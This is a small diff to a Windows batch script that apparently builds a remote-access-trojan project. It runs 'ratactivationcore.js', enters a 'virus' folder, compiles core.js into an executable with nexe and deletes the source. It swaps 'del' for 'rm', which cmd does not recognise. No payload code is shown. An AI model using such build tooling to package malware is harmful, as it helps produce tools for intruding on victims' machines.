@@ -1,6 +1,7 @@
 @echo off
 node ratactivationcore.js
-cd ../virus
+cd ..
+cd virus
 nexe core.js
 pause
-del core.js
+rm core.js
